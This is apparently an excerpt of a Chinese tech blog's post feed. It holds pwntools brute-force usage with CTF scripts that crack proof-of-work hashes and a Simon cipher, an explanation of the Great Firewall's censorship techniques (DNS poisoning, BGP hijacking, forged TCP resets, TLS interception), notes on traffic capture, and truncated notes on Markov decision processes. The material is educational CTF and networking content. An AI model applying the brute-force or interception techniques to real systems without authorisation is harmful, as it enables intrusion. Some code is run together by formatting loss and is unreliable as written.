递减；</li><li><code>start=(N,i)</code>，将搜索空间分成N块从第i块开始穷举；缺省为(1,1)</li><li><code>threads</code>线程数，缺省为CPU核心数；</li></ul><h3 id="使用方法">使用方法</h3><h4 id="安装-pwntools">安装 <strong>PwnTools</strong></h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">apt-get</span> update$ <span class="token function">apt-get</span> <span class="token function">install</span> python3 python3-pip python3-dev <span class="token function">git</span> libssl-dev libffi-dev build-essential$ python3 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pip$ python3 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pwntools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="调用">调用</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> pwnlib<span class="token keyword">from</span> pwnlib<span class="token punctuation">.</span>util<span class="token punctuation">.</span>iters <span class="token keyword">import</span> mbruteforce<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="注意事项">注意事项</h4><p>自行注意时间复杂度，无法爆破的就不要无谓尝试了。</p><h4 id="示例">示例</h4><h5 id="simon-cipher-中已知密钥密文针对原文爆破解密算法不可用时"><em>SimonCipher</em> 中已知密钥、密文针对原文爆破（解密算法不可用时）</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Author: sfc9982</span><span class="token comment"># Contest: 春秋杯-Reverse</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> simon <span class="token keyword">import</span> SimonCipher<span class="token keyword">import</span> binasciienc <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">0x9D71B8C865FB877F</span><span class="token punctuation">,</span>    <span class="token number">0x9A9CB1DF658F9D39</span><span class="token punctuation">,</span>    <span class="token number">0x8F11F68E6542DAB4</span><span class="token punctuation">,</span>    <span class="token number">0x8C39FB9965486ACA</span><span class="token punctuation">,</span>    <span class="token number">0x63E7A479FFFFFFFF</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">simonbf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token number">0x8040201008040201</span>    <span class="token keyword">for</span> ans <span class="token keyword">in</span> enc<span class="token punctuation">:</span>        iters<span class="token punctuation">.</span>mbruteforce<span class="token punctuation">(</span>            <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> SimonCipher<span class="token punctuation">(</span>                key<span class="token punctuation">,</span>                mode<span class="token operator">=</span><span class="token string">"ECB"</span><span class="token punctuation">,</span>                key_size<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>                block_size<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">,</span>            <span class="token punctuation">)</span><span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token operator">==</span> ans<span class="token punctuation">,</span>            string<span class="token punctuation">.</span>hexdigits<span class="token punctuation">,</span>            <span class="token number">16</span><span class="token punctuation">,</span>            <span class="token string">"fixed"</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span>    <span class="token comment"># print(s)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    simonbf<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="sha256">SHA256</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> parse <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> pwnlib<span class="token punctuation">.</span>util<span class="token punctuation">.</span>iters <span class="token keyword">import</span> bruteforce<span class="token keyword">import</span> string<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha256<span class="token keyword">def</span> <span class="token function">brute_force</span><span class="token punctuation">(</span>prefix<span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> bruteforce<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span>sha256<span class="token punctuation">(</span>x<span class="token operator">+</span>prefix<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>s<span class="token punctuation">,</span>string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span>length<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>method<span class="token operator">=</span><span class="token string">'fixed'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token number">9982</span><span class="token punctuation">)</span>data <span class="token operator">=</span> r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>prefix<span class="token punctuation">,</span> s <span class="token operator">=</span> parse<span class="token punctuation">(</span><span class="token string">"sha256(flag{}) == {}"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>brute_force<span class="token punctuation">(</span>prefix<span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="使用迭代器">使用迭代器</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> sha1<span class="token punctuation">(</span>prefix <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\0\0'</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> <span class="token number">52511</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'starting with '</span><span class="token punctuation">)</span>prefix <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">print</span> string<span class="token punctuation">.</span>ascii_letterss <span class="token operator">=</span> util<span class="token punctuation">.</span>iters<span class="token punctuation">.</span>mbruteforce<span class="token punctuation">(</span>f<span class="token punctuation">,</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'fixed'</span><span class="token punctuation">)</span>test <span class="token operator">=</span> prefix <span class="token operator">+</span> ssh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>test<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析中国国家防火墙(GFW)及其主要技术</title>
      <link href="/2021/11/25/qian-xi-zhong-guo-guo-jia-fang-huo-qiang-gfw-ji-qi-zhu-yao-ji-zhu/"/>
      <url>/2021/11/25/qian-xi-zhong-guo-guo-jia-fang-huo-qiang-gfw-ji-qi-zhu-yao-ji-zhu/</url>
      
        <content type="html"><![CDATA[<h1 id="数据跨境安全网关---中国国家防火墙---防火长城---gfw">数据跨境安全网关- 中国国家防火墙 - 防火长城 - GFW</h1><h2 id="gfw-简介">GFW 简介</h2><blockquote><p><strong><a href="http://www.cac.gov.cn/2021-11/14/c_1638501991577898.htm">《网络数据安全管理条例（征求意见稿）》</a></strong>2021年11月14日</p><p><strong>第四十一条</strong>国家建立数据跨境安全网关，对来源于中华人民共和国境外、法律和行政法规禁止发布或者传输的信息予以阻断传播。</p><p>任何个人和组织不得提供用于穿透、绕过数据跨境安全网关的程序、工具、线路等，不得为穿透、绕过数据跨境安全网关提供互联网接入、服务器托管、技术支持、传播推广、支付结算、应用下载等服务。</p><p>境内用户访问境内网络的，其流量不得被路由至境外。</p><p><strong>第七十三条</strong>（十一）数据跨境安全网关是指阻断访问境外反动网站和有害信息、防止来自境外的网络攻击、管控跨境网络数据传输、防范侦查打击跨境网络犯罪的重要安全基础设施。</p></blockquote><p><strong>防火长城</strong>（英语：GreatFirewall，常用简称：GFW），中文也称中国国家防火墙，俗称墙、网络长城、防火墙等等，中国国家互联网信息办公室称为数据跨境安全网关。</p><h2 id="主要技术">主要技术</h2><h3 id="域名解析服务缓存污染-dns污染">域名解析服务缓存污染（DNS污染）</h3><h4 id="什么是-dns-域名解析服务">什么是 DNS （域名解析服务）</h4><blockquote><p><a href="https://aws.amazon.com/cn/route53/what-is-dns/">AWS-Amazon</a></p></blockquote><p>Internet上的所有计算机，从您的智能手机或笔记本电脑到可提供大量零售网站内容的服务器，均通过使用编号寻找另一方并相互通信。这些编号称为IP 地址。当您打开 Web浏览器并前往一个网站时，用户不必记住和输入长编号。而是输入域名（如example.com），然后在正确的位置结束。</p><p>DNS 服务是一种全球分布式服务，它将人类可读的名称 (如 www.example.com)转换为数字 IP 地址 (如 192.0.2.1)，供计算机用于相互连接。Internet 的 DNS系统的工作原理和电话簿相似，都是管理名称和数字之间的映射关系。DNS服务器将名称请求转换为 IP 地址，对终端用户在 Web浏览器中输入域名时所访问的服务器进行控制。这些请求称为查询。</p><h4 id="域名解析服务缓存污染-dns劫持">域名解析服务缓存污染 /DNS劫持</h4><p>DNS劫持是一类旁观者攻击，攻击者借由其在网络拓扑中的<strong>特殊位置</strong>，发送比真实的DNS回应更早到达攻击目标的<strong>伪造DNS回应</strong>。一部连上了互联网的电脑一般都会使用互联网服务提供商提供的递归DNS服务器，这个服务器通常都会将部分客户曾经请求过的域名暂存起来。缓存污染攻击就是针对这一特性，影响服务器的用户或下游服务。</p><p>在中国大陆，对所有经过防火长城的在<code>UDP</code>的<code>53</code>端口上的域名查询进行IDS入侵检测，一经发现与黑名单关键词相匹配的域名查询请求，会马上伪装成目标解析服务器注入伪造的查询结果。攻击仅出现在DNS查询之路由经过防火长城时<strong>[注1]</strong>。伪造的查询结果中的IP地址不是一成不变的，在一段时间后会更新。</p><blockquote><p><strong>[注 1]: </strong></p><p>中国大陆用户查询当地的DNS服务器收到错误结果是域名解析缓存所致，其并没有直接受到防火长城的DNS劫持攻击。</p><p>（可以理解为地方DNS服务器继承了错误的查询结果）</p></blockquote><p>对于TCP协议下的域名查询(DoT: DNS overTLS)，防火长城可使用TCP重置攻击的方法进行干扰。</p><h3 id="ip地址或传输层端口封锁">IP地址或传输层端口封锁</h3><p>对拦截行为观察发现，在早期技术实现中，会使用<strong>访问控制列表</strong>（<code>ACL</code>）技术来封锁特定的IP地址，由此延伸可以封锁传输层协议（<code>TCP</code>或<code>UDP</code>）的<strong>特定目的</strong>端口的网络流量。不过由于大量的<code>ACL</code>匹配会导致网络性能不佳。现在主要是采用了效率更高的路由扩散技术封锁特定IP地址，也就是通过将需要拦截的IP地址<strong>配置为空路由</strong>、<strong>黑洞设备</strong>或<strong>特别配置的自治域网络</strong>上，然后通过动态路由协议将相应配置路由扩散到公众互联网网络中，从将条件匹配拦截行为转为路由器的常规转发行为，从而提高拦截效率。多见于自主拥有大量IP地址段的需要审查的企业中。</p><blockquote><p>在大规模自治域的出入口路由器上新接入一个起控管作用的子网或者AS域，将要受控的网络地址配置在这个子网或者AS域内的路由器中，这样利用<strong>动态路由协议的网络拓扑自动识别特性</strong>，在出入口路由器上将生成受控网络地址的路由信息，将自治域内部网络对这些受控网络地址的访问转入到这个控管子网或者AS域的网络中，从而实现对受控网络地址的流量控制。</p></blockquote><h4 id="边界网关协议bgp劫持">边界网关协议（BGP）劫持</h4><p>边界网关协议（BGP）劫持是指通过一个自治系统<strong>错误宣称</strong>IP为其所有，使得使用边界网关协议维护的互联网路由表的路由器错误地将用户发送的数据传送给非数据传送目的地</p><h5 id="bgp">BGP</h5><p><strong>边界网关协议</strong>（英语：<code>Border Gateway Protocol</code>，缩写：<code>BGP</code>）是互联网上一个核心的去中心化自治路由协议。它通过维护IP路由表或“前缀”表来实现自治系统（<code>AS</code>）之间的可达性，属于矢量路由协议。<code>BGP</code>不使用传统的内部网关协议（<code>IGP</code>）的指标，而使用基于路径、网络策略或规则集来决定路由。因此，它更适合被称为矢量性协议，而不是路由协议。</p><h5 id="背景">背景</h5><p>任何连接上互联网的主机，通过其自身的IP地址，能够与世界上任何连接上互联网的主机通信。主机将数据传送给路由器，每个路由器再将数据包传给另一个路由器，直到数据被传递给目的主机。为了顺利将数据传递到目的主机，每个路由器必须定期提供最新的路由表。具有相同的IP地址前缀的IP为同一家自治系统（<code>AS</code>）拥有，自治系统之间的路由器的路由表通过边界网关协议进行维护。边界网关协议能让路由表内保存最佳路由路线。</p><p>每个自治系统都通过边界网关协议来表明它可以向哪些IP前缀发送数据。例如如果IP前缀<code>192.0.2.0/24</code>位于<code>AS 64496</code>内，那么该自治系统就会将向其供应商表示它可以向<code>192.0.2.0/24</code>发送任何数据。</p><h5 id="劫持">劫持</h5><p>可以通过以下几种方式进行劫持：</p><ul><li>一个自治系统宣称一些IP前缀归其所有，但实际上并不是</li><li>一个自治系统声称拥有某个IP前缀范围比实际声明拥有某个IP前缀的自治系统要更小</li><li>一个自治系统声称它可以通过一条比已知的更短的路径将数据传递到被劫持的自治系统，而不管该路径是否真的存在</li></ul><p>这些方式的共同点是它们<strong>破坏了网络的正常路由</strong>，自治系统宣称的内容被添加至使用边界网关协议的路由器的路由表中，那<strong>路由器则会根据路由表将数据包传输给错误的自治系统</strong>，数据包最终无法被转发到目的地。</p><h4 id="黑洞攻击">黑洞攻击</h4><p>封包舍弃攻击或黑洞攻击是在电脑网络中，一种借由<strong>丢弃封包</strong>的<strong>阻断服务攻击</strong>。这种攻击可以是选择性（如：对于一网络位址，每n个封包和每t秒，或乱数选择一定比例的封包，也称作<strong>灰洞攻击</strong>）或成批的（如：舍弃所有封包）。</p><h4 id="针对tcp和udp连接的封锁">针对TCP和UDP连接的封锁</h4><p>2011年3月，防火长城曾经对Google部分服务器的IP地址实施自动封锁（按时间段）某些端口，按时段对www.google.com（用户登录所有Google服务时需此域名加密验证）和mail.google.com的几十个IP地址的443端口实施自动封锁，具体是每10或15分钟可以连通，接着断开，10或15分钟后再连通，再断开，如此循环，使中国大陆用户和Google主机之间的连接出现<strong>间歇性中断</strong>，使其各项加密服务出现问题。Google指责中国这样的封锁手法，因为Gmail并非被完全阻断，营造出Google服务“不稳定”的<strong>假象</strong>，表面看上去好像问题出自Google本身。</p><p>2014年5月27日起，Gmail网页版的80和443端口被屏蔽。2014年12月26日起，Gmail客户端所用的<code>IMAP/SMTP/POP3</code>端口也被屏蔽。</p><p>目前防火长城会通过限制QoS优先级的方式干扰向境外的UDP连接，如网站使用<code>HTTP/3（QUIC）</code>协议时。</p><h3 id="tcp连接重置">TCP连接重置</h3><p><code>TCP</code>重置是<code>TCP</code>的一种消息，用于重置连接。一般来说，例如服务器端在没有客户端请求的端口或者其它连接信息不符时，系统的TCP协议栈就会给客户端回复一个<code>RESET</code>通知消息，可见<code>RESET</code>功能本来用于应对例如服务器意外重启等情况。防火长城切断TCP连接的技术实际上就是比连接双方更快地发送连接重置消息，使连接双方认为对方终止了连接而自行关闭连接。</p><p>一般这种攻击方法需要结合相应的检测方式来实施，见下文：<strong>深度包检测</strong>。</p><h4 id="tcp重置攻击">TCP重置攻击</h4><p>TCP重置攻击指的是使用伪造的TCP重置包干扰用户和网站的连接。这个技术可以在善意的防火墙中应用，但也可用于网络审查或是攻击，恶意中断TCP连接，是一种旁观者攻击。中国大陆的防火长城会自动执行TCP重置攻击，来阻断不符合中国的法律法规的网站。</p><h5 id="tcp重置">TCP重置</h5><p>在传输控制协议（TCP）连接的数据包流中，每个数据包都包含一个TCP包头。这些包头中的每一个都包含一个称为“复位”（<code>RST</code>）标志的位。在大多数数据包中，该位设置为0，并且无效；但是，如果此位设置为1，则向接收计算机指示该计算机应立即停止使用TCP连接；它不应使用连接的标识号（端口）发送更多数据包，并丢弃接收到的带有包头的其他数据包，这些包头指示它们属于该连接。TCP重置基本上会立即终止TCP连接。</p><p>按照最初的设计，这是一个有用的工具。常见的应用是在进行TCP连接时计算机（计算机A）崩溃的情况。另一端的计算机（计算机B）将继续发送TCP数据包，因为它不知道计算机A已崩溃。重新启动计算机A后，它将从旧的崩溃前连接接收数据包。计算机A没有这些数据包的上下文，也无法知道如何处理这些数据包，因此它可以向计算机B发送TCP重置。此重置使计算机B知道该连接不再起作用。计算机B上的用户现在可以尝试其他连接或采取其他措施。</p><h5 id="伪造tcp重置">伪造TCP重置</h5><p>在上述情况下，TCP重置是由作为连接端点之一的计算机发送的。但操作中，第三台计算机可以监视连接上的TCP数据包，然后将包含TCP重置的“伪造”数据包发送到一个或两个端点。伪造数据包中的报头必须错误地表明它来自端点，而不是伪造者。此信息包括端点IP地址和端口号。IP和TCP包头中的每个字段都必须设置为令人信服的伪造值，以进行伪重置，以欺骗端点关闭TCP连接。正确格式化的伪造TCP重置可能是中断伪造者可以监视的任何TCP连接的非常有效的方法。</p><h4 id="状态防火墙">状态防火墙</h4><p>状态防火墙（英语：Statefulfirewall），一种能够提供状态数据包检查（stateful packetinspection，缩写为SPI）或状态查看（statefulinspection）功能的防火墙，能够持续追踪穿过这个防火墙的各种网络连线（例如TCP与UDP连线）的状态。这种防火墙被设计来区分不同连线种类下的合法数据包。只有符合主动连线的数据包才能够被允许穿过防火墙，其他的数据包都会被拒绝。</p><p>状态数据包检查也被称为动态数据包过滤（Dynamic PacketFiltering）。</p><h5 id="基本原理">基本原理</h5><p>状态防火墙监视网络连接的“状态”，比如TCP流、UDP数据和ICMP消息可能被分为<code>LISTEN</code>,<code>ESTABLISHED</code>,或者<code>CLOSING</code>状态。按照相应的安全策略，状态防火墙在状态表中为各TCP流或者UDP数据创建记录。凡在表中的<code>session</code>，所有相关数据包都被允许通过，不再检测，因此比一般的检测使用更少CPU。</p><p>维持一个<code>session</code>的状态取决于其传输层协议。比如TCP是面向连接的协议，其<code>session</code>是由三路握手的SYN消息创建，由FIN消息终止。状态防火墙由此可以知道何时从表中移除<code>session</code>，而不必等待超时再移除。UDP是无连接的协议，它不会发送特别的连接消息，因此一个UDP的<code>session</code>只有等待超时才会被移除，UDP打洞就利用了这一特性设立隧道。ICMP消息与TCP和UDP不同，它传递网络本身的控制信息，比如<code>ping</code>命令。ICMP回复一般会被允许。有时UDP通信会使用ICMP来提供<code>session</code>的状态信息，因此和某UDP<code>session</code>有关的ICMP回复也是允许的。</p><h3 id="深度包检测">深度包检测</h3><p>深度报文检测（Deep packet inspection,DPI）是一种于应用层对网络上传递的资料进行侦测与处理的技术，被广泛用于入侵检测、流量分析及数据挖掘。就字面意思考虑，所谓“深度”是相对于普通的报文检测而言的——相较普通的报文检测，DPI可对报文内容和协议特征进行检测。</p><p>在中国大陆，DPI一度被ISP用于追踪用户行为以改善其广告推送业务的精准性，而最近则被开放网络促进会视为防火长城城赖以检测关键词及嗅探加密流量的重要技术之一。基于必要的硬件设施、适宜的检测模型（关键字过滤）及相应的模式匹配算法，防火长城能够精确且快速地从实时网络环境中判别出有悖于预期标准的可疑流量，并对此及时作出审查者所期望的应对措施。</p><h3 id="tls站点证书中间人攻击">TLS站点证书中间人攻击</h3><p>2013年1月26日，有中国大陆的用户在访问GitHub时发现证书无效，经检查发现，GitHub的证书变为了一自签署的<code>X.509</code>证书，生成时间为2013年1月25日，有效期一年，故有人推测GitHub疑似遭到了中间人攻击。GreatFire和研究人员认为攻击是由中国政府策划的。</p><p>自2014年8月28日起，原先可以通过<strong>IPv6</strong>直连Google的中国教育网（<code>CERNET</code>）内试图通过https连接<em><code>.google.com.</code></em>等网页时，可能收到SSL证书错误的提示，其中以连接www.google.com.hk几乎是每次连接均收到攻击，而其它连接例如<code>ipv6.google.com</code>和<code>accounts.google.com</code>也有受到攻击的报告，但攻击发生的几率相对较低。伪造的SSL证书显示其为google.com，颁发机构即为其本身，与真正的证书不同，显示谷歌在中国教育网上受到中间人攻击（<code>MITM attack</code>）。</p><p>2015年1月17日，Outlook遭到了中间人攻击。</p><h2 id="实现与部署">实现与部署</h2><p>据2010年的估计，防火长城可能拥有数百台曙光4000L服务器。</p><figure><img src="https://googles.plus/images/loading.gif" data-original="/images/Topology_of_the_Chinese_firewall.avif" alt="典型意义上的中国国家防火墙网络拓扑图 （结合实际骨干网出口情况，图中不包括中华人民共和国台湾省）"><figcaption aria-hidden="true">典型意义上的中国国家防火墙网络拓扑图（结合实际骨干网出口情况，图中不包括中华人民共和国台湾省）</figcaption></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 网络 </tag>
            
            <tag> GFW </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用户流量采集方式：分光、镜像</title>
      <link href="/2021/11/24/yong-hu-liu-liang-cai-ji-fang-shi-fen-guang-jing-xiang/"/>
      <url>/2021/11/24/yong-hu-liu-liang-cai-ji-fang-shi-fen-guang-jing-xiang/</url>
      
        <content type="html"><![CDATA[<figure><img src="https://googles.plus/images/loading.gif" data-original="/images/Topology_of_the_Chinese_firewall.avif" alt="典型意义上的中国国家防火墙网络拓扑图 （结合实际骨干网出口情况，图中不包括中华人民共和国台湾省）"><figcaption aria-hidden="true">典型意义上的中国国家防火墙网络拓扑图（结合实际骨干网出口情况，图中不包括中华人民共和国台湾省）</figcaption></figure><h2 id="流量采集方式">流量采集方式</h2><p>IP网中的用户流量采集方式有多种方式，例如<code>Port Montoring</code>、<code>WCCP</code>协议(WebCache CommunicationProtocol)的流量重定向、分光器流量采集、四层交换机的流量重定向等，在具体应用时，可根据网络结构、网络流量、设备特点等情况决定采用合适的流量采集方式。</p><p>现对<code>Port Montoring</code>和分光器两种方式分别进行说明，并进行分析比较。</p><h3 id="方式一端口镜像port-monitoring">方式一：端口镜像（PortMonitoring）</h3><p>通过在网络的核心层或汇聚层交换机上设置端口镜像，将交换机上联端口的出境流量复制（镜像）一份到OpenetBSMP前置机上，即可采集到所有用户访问网络的请求。目前，绝大部分中高端交换机均支持端口镜像功能，如<code>Cisco Catalyst</code>序列、<code>3Com CoreBuilder</code>序列、华为的<code>S8000</code>序列、Foundry的<code>BigIron 4000/8000</code>序列、Extreme的<code>BD6800/AP3800</code>序列等，或者是中国国家防火墙使用的<code>曙光4000L</code>序列。</p><h4 id="优点">优点：</h4><ul><li><p>1.成本低廉，不需要增加任何网络设备；</p></li><li><p>2.启动端口镜像会话(Session)时，对交换机的性能基本无影响；</p></li><li><p>3.可从交换机上采集到所有用户访问请求数据；</p></li><li><p>4.故障保护，当采集系统或前置机出现故障时，对现有的网络和业务没有任何影响。</p></li></ul><h4 id="缺点">缺点：</h4><ul><li><p>1.占用交换机端口：采集系统需要和交换机直连，将占用交换机一定数量的GE和FE端口；</p></li><li><p>2.需要修改交换机配置：需要修改交换机的配置，将合适的流量复制到镜像端口，但在修改配置时不会对交换机性能和业务有影响；</p></li></ul><h3 id="方式二分光器-optical-splitter">方式二：分光器 (OpticalSplitter)</h3><p>对于某些节点，宽带接入服务器通过光口GE链路直接与核心路由器（一般为<code>Cisco GSR</code>）相连，宽带接入服务器及<code>GSR</code>均不支持端口镜像，这时采用分光器进行流量采集是最合适的方法。当某些节点的核心交换机、汇聚层交换机没有足够的GE端口，不适合采用端口镜像进行流量采集时，或希望在出口采集网络流量，就可以采分光器进行流量采集。分光器是一种无源光器件，通过在物理层上进行光复制来进行用户访问请求数据的采集，其优缺点如下。</p><h4 id="优点-1">优点</h4><ul><li><p>1.性能优异：可支持<code>GE</code>甚至在2.5Gbps<code>POS</code>链路上通过分光器进行流量采集；</p></li><li><p>2.故障保护：当采集系统故障时，对现有网络及业务无任何影响；</p></li><li><p>3.无需修改现有网络设备的任何配置，不改变网络结构，可采集到所有的网络流量，和网络无缝集成；</p></li><li><p>4.可靠性高：分光器是一种无源光器件，可以看作是一种特制的光纤，可靠性高；</p></li><li><p>5.不占用网络设备端口，投入成本低。</p></li></ul><h4 id="缺点-1">缺点</h4><ul><li>1.需要将设备的上联光纤改为分光器，这涉及到一次简单的网络割接，这将导致网络瞬时中断（不超过5秒钟），对业务有细微的影响；</li></ul><h2 id="总结">总结</h2><p>现实中，国家级、商业级、企业级的流量采集一般采用分光的方法。对于环境多变的个人和小型流量采集场景，多用端口镜像。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络 </tag>
            
            <tag> 大数据 </tag>
            
            <tag> Big Data </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【强化学习/概率论笔记】马尔可夫决策过程</title>
      <link href="/2021/11/24/qiang-hua-xue-xi-gai-lu-lun-bi-ji-ma-er-ke-fu-jue-ce-guo-cheng/"/>
      <url>/2021/11/24/qiang-hua-xue-xi-gai-lu-lun-bi-ji-ma-er-ke-fu-jue-ce-guo-cheng/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍">0.介绍</h2><blockquote><p>Refer: Wikipedia</p></blockquote><p>在数学中，<strong>马尔可夫决策过程</strong>（英语：Markov DecisionProcess，<strong>MDP</strong>）是<a href="https://zh.wikipedia.org/w/index.php?title=離散時間&amp;action=edit&amp;redlink=1">离散时间</a><a href="https://zh.wikipedia.org/wiki/隨機">随机</a><a href="https://zh.wikipedia.org/wiki/最佳控制">控制</a>过程.它提供了一个数学框架，用于在结果部分随机且部分受决策者控制的情况下对<a href="https://zh.wikipedia.org/wiki/決策">决策</a>建模。MDP对于研究通过<a href="https://zh.wikipedia.org/wiki/動態規劃">动态规划</a>解决的优化问题很有用。MDP至少早在1950年代就已为人所知；一个对马尔可夫决策过程的核心研究是<a href="https://zh.wikipedia.org/w/index.php?title=羅納德·A·霍華德&amp;action=edit&amp;redlink=1">罗纳德·霍华德</a>于1960年出版的《动态规划和马尔可夫过程》.它们被用于许多领域，包括机器人学，自动化，经济学和制造业。MDP的名称来自俄罗斯数学家<a href="https://zh.wikipedia.org/wiki/安德雷·馬可夫">安德雷·马尔可夫</a>，因为它们是<a href="https://zh.wikipedia.org/wiki/馬可夫鏈">马尔可夫链</a>的推广。</p><p>在每个时间步骤中，随机过程都处于某种状态 <span class="math inline">\(s\)</span> ，决策者可以选择在状态 <span class="math inline">\(s\)</span> 下可用的动作 <span class="math inline">\(a\)</span>.该随机过程在下一时间步骤会随机进入新状态 <span class="math inline">\(s'\)</span> ，并给予决策者相应的回馈 <span class="math inline">\({R_a}(s,s')\)</span> 。</p><p>随机过程进入新状态 <span class="math inline">\(s\)</span>的概率受所选操作影响.具体来说，它是由状态变换函数 <span class="math inline">\({P_a}(s,s')\)</span> 给出的.因此，下一个状态<span class="math inline">\(s'\)</span> 取决于当前状态 <span class="math inline">\(s\)</span> 和决策者的动作 <span class="math inline">\(a\)</span> .但是给定 <span class="math inline">\(s\)</span> 和 <span class="math inline">\(a\)</span> ，它条件独立于所有先前的状态和动作；换句话说，MDP的状态变换满足马尔可夫性质。</p><p>马尔可夫决策过程是马尔可夫链的推广，不同之处在于添加了行动（允许选择）和奖励（给予动机）。反过来说，如果每个状态只存在一个操作和所有的奖励都是一样的，一个马尔可夫决策过程可以归结为一个马尔可夫链。</p><h2 id="定义">1.定义</h2><h3 id="定义-1">1.1 定义</h3><p>马尔可夫决策过程是一个4元组 <span class="math inline">\((S,A,{P_a},{R_a})\)</span> ，其中:</p><ul><li><span class="math inline">\(S\)</span> 是状态空间的集合，</li><li><span class="math inline">\(A\)</span>是动作的集合，也被称为动作空间（比如说 <span class="math inline">\(A_s\)</span> 是状态 <span class="math inline">\(s\)</span> 中可用的动作集合)</li><li> $ {P_a} (s,s' ) = \Pr ( {s_{t + 1} } = s' \mid {s_t} = s,{a_t} = a) $ 是 $t$ 时刻 $s$ 状态下的动作 $a$ 导致 $t+1$ 时刻进入状态 $s'$ 的概率 </li><li><span class="math inline">\(R_{a}(s,s')\)</span> 状态 <span class="math inline">\(s\)</span> 经过动作 <span class="math inline">\(a\)</span> 转换到状态 <span class="math 